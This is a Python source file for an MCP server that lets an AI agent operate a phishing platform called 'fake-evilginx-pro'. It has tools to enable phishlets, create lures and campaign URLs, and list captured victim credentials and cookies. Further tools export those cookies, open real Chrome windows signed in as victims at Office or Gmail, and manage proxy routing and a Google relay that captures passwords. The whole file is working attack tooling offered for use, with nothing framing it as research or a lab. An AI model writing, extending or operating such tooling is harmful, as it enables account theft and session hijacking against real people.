#!/usr/bin/env python3
"""egmcp — MCP server for fake-evilginx-pro (stdio transport).

Lets an AI agent operate the whole platform: phishlets, lures, sessions,
upstream proxy, the Google real-browser relay — and open captured sessions
in a real browser on THIS machine (operator workstation).

Config: reuses the egconsole node list (tools/my-servers.json) — each entry
{name, host, port, base, ca, cert, key} plus an optional
"relay": {"host": "127.0.0.1", "port": 9445, "op_key": "..."} block for the
bgrelay sidecar (reachable via localhost or an SSH tunnel).

Env: EG_MCP_SERVERS (path to the servers file), EG_MCP_DEFAULT_SERVER.

Run (Claude Desktop / ZCode / Claude Code stdio command):
    python tools/mcp/egmcp.py
"""

import argparse
import http.client
import json
import os
import re
import secrets
import ssl
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.dirname(HERE)
if TOOLS_DIR not in sys.path:
    sys.path.insert(0, TOOLS_DIR)

from lib.egapi import Api, load_servers, pick_server  # noqa: E402
from lib import cookies as egcookies  # noqa: E402
from lib import session_launcher  # noqa: E402

from mcp.server.fastmcp import FastMCP

mcp = FastMCP("fake-evilginx-pro")


def _api(server=None):
    return Api(pick_server(server))


def _res(code, out):
    return f"HTTP {code}\n{json.dumps(out, indent=1, default=str)[:8000]}"


def _relay_http(server, method, path, op_key):
    srv = pick_server(server)
    r = srv.get("relay") or {}
    host, port = r.get("host", "127.0.0.1"), int(r.get("port", 9445))
    conn = http.client.HTTPConnection(host, port, timeout=20)
    conn.request(method, path, headers={"X-Op-Key": op_key or r.get("op_key", "")})
    resp = conn.getresponse()
    raw = resp.read()
    conn.close()
    try:
        return resp.status, json.loads(raw or b"{}")
    except Exception:
        return resp.status, raw.decode("utf-8", "replace")[:500]


# ------------------------------------------------------------ cookie utils ---
def _spawn_detached(args):
    flags = 0
    if os.name == "nt":
        flags = 0x00000008 | 0x00000200  # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
    subprocess.Popen([sys.executable, os.path.abspath(__file__)] + args,
                     creationflags=flags, stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


# ================================================================ tools ====
@mcp.tool()
def servers_list() -> str:
    """List configured nodes (from my-servers.json) and which is the default."""
    servers, err = load_servers()
    if err:
        return f"ERROR: {err}"
    dflt = os.environ.get("EG_MCP_DEFAULT_SERVER") or (servers[0]["name"] if servers else "")
    out = [{"name": s["name"], "host": s["host"], "port": s["port"],
            "relay_configured": bool(s.get("relay")), "default": s["name"] == dflt}
           for s in servers]
    return json.dumps(out, indent=1)


@mcp.tool()
def status(server: str = "") -> str:
    """Node heartbeat: status, time, active sessions count."""
    code, out = _api(server).call("GET", "/status")
    return _res(code, out)


# ------------------------------------------------------------- phishlets ---
@mcp.tool()
def phishlets_list(server: str = "") -> str:
    """List phishlets with enabled/disabled status."""
    code, out = _api(server).call("GET", "/phishlets")
    return _res(code, out)


@mcp.tool()
def phishlet_enable(name: str, server: str = "") -> str:
    """Hot-enable a phishlet (no service restart)."""
    code, out = _api(server).call("POST", f"/phishlets/{name}/enable")
    return _res(code, out)


@mcp.tool()
def phishlet_disable(name: str, server: str = "") -> str:
    """Hot-disable a phishlet (zero impact on other phishlets)."""
    code, out = _api(server).call("POST", f"/phishlets/{name}/disable")
    return _res(code, out)


@mcp.tool()
def phishlets_reload(server: str = "") -> str:
    """Re-read phishlet YAML files from disk on the node."""
    code, out = _api(server).call("POST", "/phishlets/reload")
    return _res(code, out)


@mcp.tool()
def phishlet_hostname(name: str, hostname: str, server: str = "") -> str:
    """Change a phishlet's base hostname (phish_sub must stay unique!)."""
    code, out = _api(server).call("POST", f"/phishlets/{name}/hostname",
                                  {"hostname": hostname})
    return _res(code, out)


# ----------------------------------------------------------------- lures ---
@mcp.tool()
def lures_list(phishlet: str = "", server: str = "") -> str:
    """List lures (id, phishlet, path, redirect_url, relay). Optional filter."""
    code, out = _api(server).call("GET", "/lures")
    if code == 200 and phishlet:
        out = [l for l in out if l.get("phishlet") == phishlet]
    return _res(code, out)


@mcp.tool()
def lure_create(phishlet: str, redirect_url: str = "", relay: bool = False,
                server: str = "") -> str:
    """Create a lure (auto token-gate). relay=True serves the Google relay page."""
    body = {"phishlet": phishlet, "token": "auto", "relay": relay}
    if redirect_url:
        body["redirect_url"] = redirect_url
    code, out = _api(server).call("POST", "/lures", body)
    return _res(code, out)


@mcp.tool()
def lure_url(lure_id: int, params: str = "", server: str = "") -> str:
    """Build the campaign URL for a lure. NOTE: the gate token is NOT included —
    read it from the lure record and append '?t=<token>' yourself."""
    qs = ("?" + params) if params else ""
    code, out = _api(server).call("GET", f"/lures/{lure_id}/url{qs}")
    code2, lures = _api(server).call("GET", "/lures")
    tok = ""
    for l in lures if code2 == 200 and isinstance(lures, list) else []:
        if str(l.get("id")) == str(lure_id):
            tok = l.get("token", "")
    msg = dict(out) if isinstance(out, dict) else {"raw": out}
    msg["reminder"] = "append ?t=" + tok + " for the gate token (campaign secret)"
    return _res(code, msg)


@mcp.tool()
def lure_edit(lure_id: int, fields_json: str, server: str = "") -> str:
    """Edit a lure. fields_json: JSON object of fields, e.g.
    {"redirect_url": "https://...", "relay": true}."""
    try:
        fields = json.loads(fields_json)
    except Exception as e:
        return f"ERROR: fields_json not valid JSON: {e}"
    code, out = _api(server).call("PUT", f"/lures/{lure_id}", fields)
    return _res(code, out)


@mcp.tool()
def lure_delete(lure_id: int, server: str = "") -> str:
    """Delete a lure."""
    code, out = _api(server).call("DELETE", f"/lures/{lure_id}")
    return _res(code, out)


# -------------------------------------------------------------- sessions ---
@mcp.tool()
def sessions_list(server: str = "") -> str:
    """List captured sessions (credentials + reusable cookies)."""
    code, out = _api(server).call("GET", "/sessions")
    return _res(code, out)


@mcp.tool()
def session_detail(session_id: str, server: str = "") -> str:
    """Full session detail: captured params + per-domain cookie sets."""
    code, out = _api(server).call("GET", f"/sessions/{session_id}")
    return _res(code, out)


@mcp.tool()
def session_delete(session_id: str, server: str = "") -> str:
    """Delete a session from the store."""
    code, out = _api(server).call("DELETE", f"/sessions/{session_id}")
    return _res(code, out)


@mcp.tool()
def session_cookies(session_id: str, server: str = "") -> str:
    """All cookies of a captured session, import-ready (playwright format),
    with import gotchas. Use open_session() to let this tool open the browser."""
    code, detail = _api(server).call("GET", f"/sessions/{session_id}")
    if code != 200:
        return _res(code, detail)
    cookies = egcookies.to_playwright_cookies(egcookies.cookies_from_session(detail), samesite=None, force_secure=False)
    return json.dumps({
        "count": len(cookies),
        "username": (detail.get("credentials") or {}).get("username"),
        "import_gotchas": [
            "expires < 0 means a session cookie — omit the field (never -1)",
            "google.com / __Host- / __Secure- cookies need secure=true",
            "__Host- cookies are URL-scoped (url=, no domain=)",
        ],
        "cookies": cookies}, indent=1, default=str)[:16000]


@mcp.tool()
def session_export(session_id: str, file: str = "", server: str = "") -> str:
    """Export a session as Cookie-Editor extension JSON (import into any browser)."""
    code, detail = _api(server).call("GET", f"/sessions/{session_id}")
    if code != 200:
        return _res(code, detail)
    cookies = egcookies.cookies_from_session(detail)
    out = egcookies.cookie_editor_export(cookies)
    path = file or os.path.join(os.environ.get("TEMP", "/tmp"),
                                f"session-{session_id}-cookies.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(out, f, indent=1)
    return f"exported {len(out)} cookies -> {path}"


@mcp.tool()
def open_session(session_id: str, url: str = "", chrome: str = "",
                 headless: bool = False, server: str = "") -> str:
    """Open a REAL Chrome window on this machine signed in as the captured
    session (evilginx-captured sessions). Spawns a detached process — the
    window stays open after this call returns."""
    srv = pick_server(server)
    args = ["--open-session", session_id, "--server", srv["name"]]
    if url:
        args += ["--url", url]
    if chrome:
        args += ["--chrome", chrome]
    if headless:
        args += ["--headless"]
    _spawn_detached(args)
    return ("browser launching in the background — session " + session_id +
            " cookies are being injected; check the new Chrome window")


# ----------------------------------------------------------------- proxy ---
@mcp.tool()
def proxy_status(server: str = "") -> str:
    """Current upstream proxy config + routes (password masked)."""
    code, out = _api(server).call("GET", "/proxy")
    return _res(code, out)


@mcp.tool()
def proxy_set(address: str = "", port: int = 0, type: str = "",
              username: str = "", password: str = "",
              routes: list[str] | None = None, enabled: bool = True,
              server: str = "") -> str:
    """Partial-update the upstream proxy (omitted fields keep their values).
    routes = domain suffixes that egress via the proxy (e.g.
    ["google.com","gstatic.com"]); everything else goes direct.
    WARNING: sending a masked password clobbers it — pass the real one or omit."""
    body = {"enabled": enabled}
    if type:
        body["type"] = type
    if address:
        body["address"] = address
    if port:
        body["port"] = port
    if username:
        body["username"] = username
    if password:
        body["password"] = password
    if routes is not None:
        body["routes"] = routes
    code, out = _api(server).call("POST", "/proxy", body)
    return _res(code, out)


@mcp.tool()
def proxy_route_add(suffix: str, server: str = "") -> str:
    """Add a domain suffix to the proxy routes (hot-apply)."""
    code, cur = _api(server).call("GET", "/proxy")
    if code != 200:
        return _res(code, cur)
    routes = cur.get("routes") or []
    if suffix not in routes:
        routes.append(suffix)
    code, out = _api(server).call("POST", "/proxy", {"routes": routes})
    return _res(code, out)


@mcp.tool()
def proxy_route_del(suffix: str, server: str = "") -> str:
    """Remove a domain suffix from the proxy routes."""
    code, cur = _api(server).call("GET", "/proxy")
    if code != 200:
        return _res(code, cur)
    routes = [r for r in (cur.get("routes") or []) if r != suffix]
    code, out = _api(server).call("POST", "/proxy", {"routes": routes})
    return _res(code, out)


@mcp.tool()
def proxy_on(server: str = "") -> str:
    """Enable the upstream proxy (config kept)."""
    code, out = _api(server).call("POST", "/proxy", {"enabled": True})
    return _res(code, out)


@mcp.tool()
def proxy_off(server: str = "") -> str:
    """Disable the upstream proxy (config kept)."""
    code, out = _api(server).call("POST", "/proxy", {"enabled": False})
    return _res(code, out)


# ----------------------------------------------------------------- relay ---
@mcp.tool()
def relay_sessions(server: str = "") -> str:
    """List bgrelay victim sessions (Google relay). Needs a relay block in the
    node config (host/port/op_key; tunnel with ssh -L 9445:127.0.0.1:9445)."""
    try:
        code, out = _relay_http(server, "GET", "/api/sessions", None)
        return _res(code, out)
    except Exception as e:
        return (f"ERROR: {e}\n(relay unreachable — is the SSH tunnel up / "
                "relay block set in my-servers.json?)")


@mcp.tool()
def relay_capture(capture_id: str, server: str = "") -> str:
    """Full Google-relay capture: {email, password, cookies[], ua, ts}."""
    try:
        code, out = _relay_http(server, "GET", f"/api/capture?id={capture_id}", None)
        if isinstance(out, dict):
            out.setdefault("import_hint",
                           "use relay_open_session() to open a signed-in browser")
        return _res(code, out)
    except Exception as e:
        return f"ERROR: {e}"


@mcp.tool()
def relay_open_session(capture_id: str, url: str = "", server: str = "") -> str:
    """Open a REAL Chrome window on this machine signed in with a Google-relay
    capture (default: Gmail inbox). Requires playwright (pip install playwright)."""
    srv = pick_server(server)
    args = ["--relay-open", capture_id, "--server", srv["name"]]
    if url:
        args += ["--url", url]
    _spawn_detached(args)
    return ("browser launching in the background with capture " + capture_id +
            "; check the new Chrome window")


# ============================================================ API key ======
# The MCP API key gates the HTTP transport (remote agents). Local stdio runs
# don't need it. Key file is gitignored; EG_MCP_API_KEY overrides it.
KEY_FILE = os.path.join(HERE, "mcp.key")


def load_or_create_key():
    key = os.environ.get("EG_MCP_API_KEY")
    if key:
        return key
    if os.path.exists(KEY_FILE):
        return open(KEY_FILE, encoding="utf-8").read().strip()
    return new_key()


def new_key():
    key = secrets.token_hex(16)
    with open(KEY_FILE, "w", encoding="utf-8") as f:
        f.write(key + "\n")
    try:
        os.chmod(KEY_FILE, 0o600)
    except OSError:
        pass
    return key


def _auth_asgi(app, api_key):
    """ASGI wrapper: every HTTP request must carry X-API-Key (or Bearer)."""
    async def wrapped(scope, receive, send):
        if scope["type"] == "http":
            headers = {k.decode().lower(): v.decode()
                       for k, v in scope.get("headers", [])}
            supplied = headers.get("x-api-key", "")
            authz = headers.get("authorization", "")
            if not supplied and authz.lower().startswith("bearer "):
                supplied = authz[7:].strip()
            if supplied != api_key:
                body = b'{"error":"invalid or missing MCP API key"}'
                await send({"type": "http.response.start", "status": 401,
                            "headers": [[b"content-type", b"application/json"],
                                        [b"content-length", str(len(body)).encode()]]})
                await send({"type": "http.response.body", "body": body})
                return
        await app(scope, receive, send)
    return wrapped


def _run_http(host, port):
    api_key = load_or_create_key()
    app = _auth_asgi(mcp.streamable_http_app(), api_key)
    import uvicorn
    print(f"[egmcp] streamable-http on http://{host}:{port}/mcp "
          f"(X-API-Key required; key file: {KEY_FILE})", flush=True)
    uvicorn.run(app, host=host, port=port, log_level="warning")


# ============================================================ worker mode ===
def _worker_open_session(args):
    """Detached worker: evilginx session -> session_launcher (real Chrome)."""
    code, detail = Api(pick_server(args.server)).call("GET", f"/sessions/{args.open_session}")
    if code != 200:
        print(f"session fetch failed: {code}", file=sys.stderr)
        time.sleep(30)
        return
    cookies = egcookies.cookies_from_session(detail)
    session_launcher.launch_with_cookies(
        cookies, url=args.url or "https://www.office.com",
        chrome=args.chrome or "", port=9222 + (hash(args.open_session) % 500),
        headless=args.headless, keep_open=True)


def _worker_relay_open(args):
    """Detached worker: relay capture -> playwright Chrome (Gmail etc.)."""
    code, cap = _relay_http(args.server, "GET", f"/api/capture?id={args.relay_open}", None)
    if code != 200:
        print(f"capture fetch failed: {code}", file=sys.stderr)
        time.sleep(30)
        return
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        b = p.chromium.launch(channel="chrome", headless=False,
                              args=["--window-size=1400,900"])
        ctx = b.new_context(user_agent=cap.get("ua") or None,
                            viewport={"width": 1400, "height": 900})
        ctx.add_cookies(egcookies.to_playwright_cookies(cap.get("cookies") or [], samesite=None, force_secure=False))
        pg = ctx.new_page()
        pg.goto(args.url or "https://mail.google.com/mail/u/0/#inbox",
                wait_until="load", timeout=60000)
        while b.is_connected():
            time.sleep(5)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--open-session")
    ap.add_argument("--relay-open")
    ap.add_argument("--server", default="")
    ap.add_argument("--url", default="")
    ap.add_argument("--chrome", default="")
    ap.add_argument("--headless", action="store_true")
    ap.add_argument("--http", action="store_true",
                    help="serve streamable-http instead of stdio (API key required)")
    ap.add_argument("--host", default=os.environ.get("EG_MCP_HOST", "127.0.0.1"))
    ap.add_argument("--port", type=int, default=int(os.environ.get("EG_MCP_PORT", "8306")))
    args = ap.parse_args()
    if args.open_session:
        _worker_open_session(args)
    elif args.relay_open:
        _worker_relay_open(args)
    elif args.http:
        _run_http(args.host, args.port)
    else:
        mcp.run()  # stdio MCP server (local, no key needed)


if __name__ == "__main__":
    main()
